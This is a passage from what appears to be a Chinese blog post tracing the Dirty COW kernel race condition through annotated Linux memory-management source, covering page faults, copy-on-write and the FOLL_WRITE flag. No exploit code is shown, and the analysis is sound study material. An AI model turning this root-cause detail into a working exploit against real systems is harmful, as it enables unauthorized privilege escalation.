&#123;</span><br><span class="line">                        <span class="keyword">int</span> ret;</span><br><span class="line">                        ret = faultin_page(tsk, vma, start, &amp;foll_flags,<span class="comment">// 当获取页表项失败触发错误处理。</span></span><br><span class="line">                                        nonblocking);</span><br><span class="line">                        <span class="keyword">switch</span> (ret) &#123;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                                <span class="keyword">goto</span> retry;<span class="comment">// 如果错误码为0，说明没什么问题，继续重试获取页表项。</span></span><br><span class="line">                       ...</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(__get_user_pages);</span><br></pre></td></tr></table></figure><p>而 FOLL_WRITE | FOLL_FORCE | FOLL_GET 等定义在<code>include/linux/mm.h</code>，如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FOLL_WRITE      0x01    <span class="comment">/* check pte is writable */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FOLL_TOUCH      0x02    <span class="comment">/* mark page accessed */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FOLL_GET        0x04    <span class="comment">/* do get_page on page */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FOLL_DUMP       0x08    <span class="comment">/* give error on hole if it would be zero */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FOLL_FORCE      0x10    <span class="comment">/* get_user_pages read/write w/o permission */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FOLL_NOWAIT     0x20    <span class="comment">/* if a disk transfer is needed, start the IO</span></span></span><br><span class="line"><span class="comment"><span class="meta">                                 * and return without waiting upon it */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FOLL_POPULATE   0x40    <span class="comment">/* fault in page */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FOLL_SPLIT      0x80    <span class="comment">/* don&#x27;t return transhuge pages, split them */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FOLL_HWPOISON   0x100   <span class="comment">/* check page is hwpoisoned */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FOLL_NUMA       0x200   <span class="comment">/* force NUMA hinting page fault */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FOLL_MIGRATION  0x400   <span class="comment">/* wait for page to replace migration entry */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FOLL_TRIED      0x800   <span class="comment">/* a retry, previous pass started an IO */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FOLL_MLOCK      0x1000  <span class="comment">/* lock present pages */</span></span></span><br></pre></td></tr></table></figure><p>调试中得到对应的gup_flags为0x17，则对应了上面的 FOLL_WRITE | FOLL_FORCE | FOLL_GET | FOLL_TOUCH</p><p>FOLL_WRITE ：检查pte是否可写。如果为0，则页面不可被写入.</p><p>FOLL_FORCE： 忽略权限对强制对用户页进行读写。</p><h5 id="follow-page-pte"><a href="#follow-page-pte" class="headerlink" title="follow_page_pte"></a>follow_page_pte</h5><p>由于第一次写的时候因为用户空间那段内存（dirtycow 程序中 map 指针指向的内存）其实还没有和实际物理页面建立映射关系，所以 follow_page_mask()函数是不可能返回正确的 page 数据结构的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># 函数调用：__get_user_pages() -&gt; follow_page_mask -&gt; follow_page_pte()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct page *<span class="title">follow_page_pte</span><span class="params">(struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pmd_t</span> *pmd, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">        <span class="keyword">if</span> (!pte_present(pte)) &#123;</span><br><span class="line">              ...</span><br><span class="line">                <span class="keyword">if</span> (pte_none(pte))<span class="comment">// 第一次write时由于虚拟内存并未与page建立联系，所以这里的pte为0.</span></span><br><span class="line">                        <span class="keyword">goto</span> no_page;</span><br><span class="line">...</span><br><span class="line">        <span class="keyword">if</span> ((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte)) &#123;</span><br><span class="line">                pte_unmap_unlock(ptep, ptl);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">       ...</span><br><span class="line">out:</span><br><span class="line">        pte_unmap_unlock(ptep, ptl);</span><br><span class="line">        <span class="keyword">return</span> page;</span><br><span class="line">no_page:</span><br><span class="line">        pte_unmap_unlock(ptep, ptl);</span><br><span class="line">        <span class="keyword">if</span> (!pte_none(pte))</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">return</span> no_page_table(vma, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="faultin-page"><a href="#faultin-page" class="headerlink" title="faultin_page"></a>faultin_page</h5><p>回到__get_user_pages()函数，由于页表获取失败，调用<code>faultin_page</code>函数来创建页表。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 函数调用：__get_user_pages()-&gt;faultin_page()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">faultin_page</span><span class="params">(struct task_struct *tsk, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">unsigned</span> <span class="keyword">int</span> *flags, <span class="keyword">int</span> *nonblocking)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line"><span class="keyword">if</span> (*flags &amp; FOLL_WRITE)</span><br><span class="line">fault_flags |= FAULT_FLAG_WRITE;</span><br><span class="line">...</span><br><span class="line">ret = handle_mm_fault(mm, vma, address, fault_flags);<span class="comment">// 处理page fault，这里由于虚拟内存未映射page导致缺页中断</span></span><br><span class="line">...</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * VM_FAULT_WRITE 位告诉我们 do_wp_page 在必要时破坏了 COW，即使 Maybe_mkwrite 决定不设置 pte_write。因此，我们可以安全地进行后续页面查找，就好像它们被读取一样。</span></span><br><span class="line"><span class="comment"> 但是只有在循环 pte_write 是徒劳的情况下才这样做：在某些情况下，用户空间可能还想写入获取的用户页面，这里的读取错误可能会阻止（只读页面可能会被用户空间写入 reCOWed）。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))</span><br><span class="line">*flags &amp;= ~FOLL_WRITE;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="handle-pte-fault"><a href="#handle-pte-fault" class="headerlink" title="handle_pte_fault"></a>handle_pte_fault</h5><p>当页表为空时，调用do_fault来创建页表。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 函数调用： faultin_page() -&gt; handle_mm_fault() -&gt; __handle_mm_fault() -&gt; handle_pte_fault()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">handle_pte_fault</span><span class="params">(struct mm_struct *mm,</span></span></span><br><span class="line"><span class="params"><span class="function">                     struct vm_area_struct *vma, <span class="keyword">unsigned</span> <span class="keyword">long</span> address,</span></span></span><br><span class="line"><span class="params"><span class="function">                     <span class="keyword">pte_t</span> *pte, <span class="keyword">pmd_t</span> *pmd, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">pte_t</span> entry;</span><br><span class="line">        <span class="keyword">spinlock_t</span> *ptl;</span><br><span class="line">...</span><br><span class="line">        <span class="keyword">if</span> (!pte_present(entry)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (pte_none(entry)) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (vma_is_anonymous(vma))</span><br><span class="line">                                <span class="keyword">return</span> do_anonymous_page(mm, vma, address,</span><br><span class="line">                                                         pte, pmd, flags);</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                                <span class="keyword">return</span> do_fault(mm, vma, address, pte, pmd,<span class="comment">// 当页表为空时，调用do_fault来申请页</span></span><br><span class="line">                                                flags, entry);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> do_swap_page(mm, vma, address,</span><br><span class="line">                                        pte, pmd, flags, entry);</span><br><span class="line">        &#125;</span><br><span class="line">...</span><br><span class="line">        <span class="keyword">if</span> (flags &amp; FAULT_FLAG_WRITE) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!pte_write(entry))</span><br><span class="line">                        <span class="keyword">return</span> do_wp_page(mm, vma, address,</span><br><span class="line">                                        pte, pmd, ptl, entry);</span><br><span class="line">                entry = pte_mkdirty(entry);</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">unlock:</span><br><span class="line">        pte_unmap_unlock(pte, ptl);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="do-fault"><a href="#do-fault" class="headerlink" title="do_fault"></a>do_fault</h5><p>do_fault()函数里面有两个重要的判断条件：一个是 FAULT_FLAG_WRITE，另外一个是 VM_SHARED。我们的场景是触发了一个写错误的缺页中断，该页对应的 VMA 是私有映射即 VMA 的属性 vma-&gt;vm_flags 没设置 VM_SHARED，见 dirtycow 程序中使用 MAP_PRIVATE 的映射属性，因此跳转到 do_cow_fault 函数中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 函数调用：  handle_pte_fault() -&gt; do_fault()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_fault</span><span class="params">(struct mm_struct *mm, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pte_t</span> *page_table, <span class="keyword">pmd_t</span> *pmd,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">pte_t</span> orig_pte)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">if</span> (!(flags &amp; FAULT_FLAG_WRITE))<span class="comment">// FAULT_FLAG_WRITE 在上面的 faultin_page 函数中已经被置位了，代表的含义为是否是写错误，很显然这里是写错误，所以不进入该分支。do_read_fault直接映射page cache。</span></span><br><span class="line">                <span class="keyword">return</span> do_read_fault(mm, vma, address, pmd, pgoff, flags,</span><br><span class="line">                                orig_pte);</span><br><span class="line">        <span class="keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_SHARED))<span class="comment">// 是否为非共享映射，也就是私有映射，这里是私有映射，进入该分支</span></span><br><span class="line">                <span class="keyword">return</span> do_cow_fault(mm, vma, address, pmd, pgoff, flags,</span><br><span class="line">                                orig_pte);</span><br><span class="line">        <span class="keyword">return</span> do_shared_fault(mm, vma, address, pmd, pgoff, flags, orig_pte);<span class="comment">// 否则为共享映射</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="do-cow-fault"><a href="#do-cow-fault" class="headerlink" title="do_cow_fault"></a>do_cow_fault</h5><p>do_cow_fault()会重新分配一个新的页面 new_page，并且调用__do_fault()函数通过文件系 统相关的 API 把 page cache 读到 fault_page 中，然后把文件内容拷贝到新页面 new_page 里。 do_set_pte()函数会使用新页面和虚拟地址重新建立映射关系，最后把 fault_page 释放了。注意 这里 fault_page 是 page cache，new_page 可是匿名页面了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># 函数调用： do_fault() -&gt; do_cow_fault()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_cow_fault</span><span class="params">(struct mm_struct *mm, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pmd_t</span> *pmd,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">pgoff_t</span> pgoff, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">pte_t</span> orig_pte)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">new_page = alloc_page_vma(GFP_HIGHUSER_MOVABLE, vma, address);<span class="comment">//执行COW， 并更新页表为COW后的页表</span></span><br><span class="line">...</span><br><span class="line">ret = __do_fault(vma, address, pgoff, flags, new_page, &amp;fault_page);<span class="comment">// 将page cache读入fault_page。</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (fault_page)</span><br><span class="line">copy_user_highpage(new_page, fault_page, address, vma);<span class="comment">// 将文件内容拷贝到new_page中，也就是COW复制出来的page。</span></span><br><span class="line">...</span><br><span class="line">do_set_pte(vma, address, new_page, pte, <span class="literal">true</span>, <span class="literal">true</span>);<span class="comment">// 将new_page与虚拟地址重新建立映射关系，之后释放fault_page。这里的fault_page为page cache。</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">uncharge_out:</span><br><span class="line">mem_cgroup_cancel_charge(new_page, memcg);</span><br><span class="line">page_cache_release(new_page);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="do-set-pte"><a href="#do-set-pte" class="headerlink" title="do_set_pte"></a>do_set_pte</h5><p>这里利用刚才新分配的页面和 vma 相关属性来生成一个新的页表项 pte entry。 </p><p>由于是写错误的缺页中断，这里的write为1，page为dirty，所以将pte的dirty位置为1，这里我们要关心maybe代表了什么含义，pte 的 write 比特位为什么不确定呢？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 函数调用： do_cow_fault() -&gt; do_set_pte()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_set_pte</span><span class="params">(struct vm_area_struct *vma, <span class="keyword">unsigned</span> <span class="keyword">long</span> address,</span></span></span><br><span class="line"><span class="params"><span class="function">struct page *page, <span class="keyword">pte_t</span> *pte, <span class="keyword">bool</span> write, <span class="keyword">bool</span> anon)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">pte_t</span> entry;</span><br><span class="line">    </span><br><span class="line">flush_icache_page(vma, page);</span><br><span class="line">entry = mk_pte(page, vma-&gt;vm_page_prot);<span class="comment">// 利用刚才新分配的页面和 vma 相关属性来生成一个新的页表项 pte entry。</span></span><br><span class="line"><span class="keyword">if</span> (write)<span class="comment">// 这里的write为1，page为dirty，所以将pte的dirty位置为1，这里我们要关心maybe代表了什么含义，pte 的 write 比特位为什么不确定呢？</span></span><br><span class="line">entry = maybe_mkwrite(pte_mkdirty(entry), vma);</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="maybe-mkwrite"><a href="#maybe-mkwrite" class="headerlink" title="maybe_mkwrite"></a>maybe_mkwrite</h5><p>注释给了我们答案：pte entry 中的 WRITE 比特位是否需要置位还需要考虑 VMA 的 vm_flags 属性是否具有可写的属性，如果有可写属性才能设置 pte entry 中的 WRITE 比特位。我们这里的场景是 mmap 通过 只读方式（PROT_READ）映射一个文件，vma-&gt;vm_flags 是没有设置 VM_WRITE 这个属性。因此 新页面 new_page 和虚拟地址建立的新的 pte entry 是：dirty 的并且只读的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 函数调用： do_set_pte() -&gt; maybe_mkwrite()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Do pte_mkwrite, but only if the vma says VM_WRITE.  We do this when</span></span><br><span class="line"><span class="comment"> * servicing faults for write access.  In the normal case, do always want</span></span><br><span class="line"><span class="comment"> * pte_mkwrite.  But get_user_pages can cause write faults for mappings</span></span><br><span class="line"><span class="comment"> * that do not have writing enabled, when used by access_process_vm.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">pte_t</span> <span class="title">maybe_mkwrite</span><span class="params">(<span class="keyword">pte_t</span> pte, struct vm_area_struct *vma)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (likely(vma-&gt;vm_flags &amp; VM_WRITE))</span><br><span class="line">pte = pte_mkwrite(pte);</span><br><span class="line"><span class="keyword">return</span> pte;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>梳理一下函数调用（通过缩进来区分函数调用关系）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mem_write</span><br><span class="line">mem_rw</span><br><span class="line">access_remote_vm</span><br><span class="line">__access_remote_vm</span><br><span class="line">    get_user_pages</span><br><span class="line">     __get_user_pages_locked</span><br><span class="line">      __get_user_pages</span><br><span class="line">       follow_page_mask</span><br><span class="line">        follow_page_pte</span><br><span class="line">       faultin_page</span><br><span class="line">        handle_mm_fault</span><br><span class="line">         __handle_mm_fault</span><br><span class="line">          handle_pte_fault</span><br><span class="line">           do_fault</span><br><span class="line">           do_cow_fault</span><br><span class="line">             do_set_pte</span><br><span class="line">              maybe_mkwrite</span><br></pre></td></tr></table></figure><p>通过上面的解释，很清楚的了解到，第一次write虽然文件内容已经映射到page cache上面，但是进程的页表还没有建立。当尝试访问该页时，发现页表项位空，从而触发了一个页错误。由于文件的属性位只读且私有映射，所以对其写入会触发COW。分配了一块新的page来建立页表项。</p><h4 id="（2）第二次write"><a href="#（2）第二次write" class="headerlink" title="（2）第二次write"></a>（2）第二次write</h4><p><strong>get_user_pages</strong>会第二次被调用会寻找页表项，<strong>follow_page_mask</strong>会调用<strong>follow_page_pte</strong>函数，这个函数会通过flag参数的<strong>FOLL_WRITE</strong>位是否为1判断要是否需要该页具有写权限，以及通过页表项的<strong>VM_WRITE</strong>位是否为1来判断该页是否可写。由于Mappedmem是以<strong>PROT_READ</strong>和<strong>MAP_PRIVATE</strong>的的形式进行映射的。所以<strong>VM_WRITE</strong>为0，又因为我们要求页表项要具有写权限，所以<strong>FOLL_WRITE</strong>为1，从而导致这次寻页会再次触发一个pagefault，<strong>faultin_page</strong>会再次调用<strong>handle_mm_fault</strong>进行处理。</p><h5 id="follow-page-pte-1"><a href="#follow-page-pte-1" class="headerlink" title="follow_page_pte"></a>follow_page_pte</h5><p>当再次执行到follow_page_pte函数时，该 pte entry 的属性是：PRESENT 位被置位，Dirty 位被置位，只读位 RDONLY 也被置位了。因此当判断到传递进来的 flags 标志是可写的，但是实际 pte entry 只是可读属性，那么这里就不会返回正确的 page 结构了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># 函数调用：__get_user_pages() -&gt; follow_page_mask -&gt; follow_page_pte()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct page *<span class="title">follow_page_pte</span><span class="params">(struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pmd_t</span> *pmd, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">        <span class="keyword">if</span> (!pte_present(pte)) &#123;</span><br><span class="line">              ...</span><br><span class="line">                <span class="keyword">if</span> (pte_none(pte))</span><br><span class="line">                        <span class="keyword">goto</span> no_page;</span><br><span class="line">...</span><br><span class="line">        <span class="keyword">if</span> ((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte)) &#123;<span class="comment">// 由于pte entry 不可写，所以走入该分支</span></span><br><span class="line">                pte_unmap_unlock(ptep, ptl);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">       ...</span><br><span class="line">out:</span><br><span class="line">        pte_unmap_unlock(ptep, ptl);</span><br><span class="line">        <span class="keyword">return</span> page;</span><br><span class="line">no_page:</span><br><span class="line">        pte_unmap_unlock(ptep, ptl);</span><br><span class="line">        <span class="keyword">if</span> (!pte_none(pte))</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">return</span> no_page_table(vma, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="handle-pte-fault-1"><a href="#handle-pte-fault-1" class="headerlink" title="handle_pte_fault"></a>handle_pte_fault</h5><p>上面 follow_page_pte()返回为 NULL，所以这次为写错误的缺页中断，进入 faultin_page()。之后经过faultin_page() -&gt; handle_mm_fault() -&gt; __handle_mm_fault() -&gt; handle_pte_fault()的函数调用到达了handle_pte_fault函数。</p><p>因为这时 pte entry 的状态为：PRESENT =1、DIRTY=1、RDONLY=1，再加上写错误异常，因此根据 handle_pte_fault()函数的判断逻辑跳转到 do_wp_page()函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 函数调用： faultin_page() -&gt; handle_mm_fault() -&gt; __handle_mm_fault() -&gt; handle_pte_fault()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">handle_pte_fault</span><span class="params">(struct mm_struct *mm,</span></span></span><br><span class="line"><span class="params"><span class="function">                     struct vm_area_struct *vma, <span class="keyword">unsigned</span> <span class="keyword">long</span> address,</span></span></span><br><span class="line"><span class="params"><span class="function">                     <span class="keyword">pte_t</span> *pte, <span class="keyword">pmd_t</span> *pmd, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">pte_t</span> entry;</span><br><span class="line">        <span class="keyword">spinlock_t</span> *ptl;</span><br><span class="line">...</span><br><span class="line">        <span class="keyword">if</span> (!pte_present(entry)) &#123;<span class="comment">// 这里的PRESENT 标志位为1，所以不走这个分支。</span></span><br><span class="line">                <span class="keyword">if</span> (pte_none(entry)) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (vma_is_anonymous(vma))</span><br><span class="line">                                <span class="keyword">return</span> do_anonymous_page(mm, vma, address,</span><br><span class="line">                                                         pte, pmd, flags);</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                                <span class="keyword">return</span> do_fault(mm, vma, address, pte, pmd,</span><br><span class="line">                                                flags, entry);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> do_swap_page(mm, vma, address,</span><br><span class="line">                                        pte, pmd, flags, entry);</span><br><span class="line">        &#125;</span><br><span class="line">...</span><br><span class="line">        <span class="keyword">if</span> (flags &amp; FAULT_FLAG_WRITE) &#123;<span class="comment">// 由于写错误，走入了该分支</span></span><br><span class="line">                <span class="keyword">if</span> (!pte_write(entry))</span><br><span class="line">                        <span class="keyword">return</span> do_wp_page(mm, vma, address,<span class="comment">// 执行do_wp_page函数去处理</span></span><br><span class="line">                                        pte, pmd, ptl, entry);</span><br><span class="line">                entry = pte_mkdirty(entry);</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">unlock:</span><br><span class="line">        pte_unmap_unlock(pte, ptl);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="wp-page-reuse"><a href="#wp-page-reuse" class="headerlink" title="wp_page_reuse"></a>wp_page_reuse</h5><p>上面调用 do_wp_page() 函数后经过一系列判断后交由 wp_page_reuse() 函数处理。这里依然调用 maybe_mkwrite()尝试置位 pte entry 中 WRITE 比特位，但是因为我们这个 vma 是只读映射的，因此这个尝试没法得逞。pte entry 依然是 RDONLY 和 DIRTY 的。注意这里返回的值是 VM_FAULT_WRITE（很关键）。<strong>VM_FAULT_WRITE</strong> 